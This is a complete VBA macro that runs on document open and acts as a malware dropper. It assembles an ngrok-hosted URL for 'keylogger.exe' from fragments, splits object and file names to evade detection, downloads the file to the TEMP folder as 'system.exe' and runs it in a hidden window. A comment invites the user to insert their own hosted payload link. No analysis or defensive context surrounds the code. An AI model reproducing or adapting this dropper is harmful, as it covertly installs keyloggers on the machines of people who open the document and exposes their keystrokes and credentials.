Sub AutoOpen()
    Dim httpObj As Object
    Dim streamObj As Object
    Dim urlParts(4) As String
    Dim fullUrl As String
    Dim tempPath As String
    Dim exeName As String

    ' Replace these URL parts with your own hosted EXE link
    urlParts(0) = "https://"
    urlParts(1) = "your."
    urlParts(2) = "ngrok."
    urlParts(3) = "domain"
    urlParts(4) = "/key" & "logger.exe"

    fullUrl = urlParts(0) & urlParts(1) & urlParts(2) & urlParts(3) & urlParts(4)

    exeName = "syst" & "em" & ".exe"
    tempPath = Environ("TEMP") & "\" & exeName

    Set httpObj = CreateObject("MS" & "XML2." & "XMLHTTP")
    httpObj.Open "GET", fullUrl, False
    httpObj.Send

    Set streamObj = CreateObject("A" & "DODB." & "Stream")
    streamObj.Type = 1
    streamObj.Open
    streamObj.Write httpObj.ResponseBody
    streamObj.SaveToFile tempPath, 2
    streamObj.Close

    Shell tempPath, vbHide
End Sub
